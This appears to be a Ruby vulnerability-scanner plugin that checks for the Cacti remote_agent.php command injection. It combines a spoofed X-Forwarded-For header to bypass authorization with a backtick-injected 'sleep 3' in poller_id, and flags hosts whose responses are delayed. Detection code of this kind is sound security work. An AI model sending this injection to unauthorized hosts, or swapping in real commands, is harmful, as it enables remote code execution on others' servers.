class RBModule_cati_front_rce
    def initialize
    end
    def metadata
        info = { "name" => "cacti_front_rce", 
            "description" => "Poc for cacti front RCE" }
        return info
    end

    def scan(uri)
        scheme = uri.scheme
        if scheme == nil 
            error("Scheme is none #{uri}")
            return 
        end

        url = scheme + "://" + "#{uri.host}:#{uri.port}" + "/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`sleep+3`"
        info("Send url:#{url}")
        before = Time.now.strftime("%s%L").to_i
        resp = Request.get(url, headers={"host"=>uri.host,"Connection"=>"close","X-Forwarded-For"=>"127.0.0.1"})
        after = Time.now.strftime("%s%L").to_i
        info("Cati cost time: #{after - before} ms, vulntest")
        if resp.body.include?("You are not authorized to use this service") 
            return 
        end

        if resp.body.include?("400 Bad Request")
            return 
        end
        if after - before > 3000 
            issue = {
                "name"=> "cati_front_rce",
                "level" => "highrisk",
                "confidence" => "confirm",
                "detail" => "this is a detail",
                "host" => "#{uri.host}:#{uri.port}",
                "response" => resp.orig_resp
            }

            IssueReporter.add_issue(issue)
        end
    end

    def passive_run(index)
        log = HistoryLog.get_req index
        url = log.url
        uri = UriParser.parse(url)
        info("Test url: #{uri}")
        scan(uri)
        #scan("http://127.0.0.1:8009")
    end
    def active_run(url, opts)
    end
end

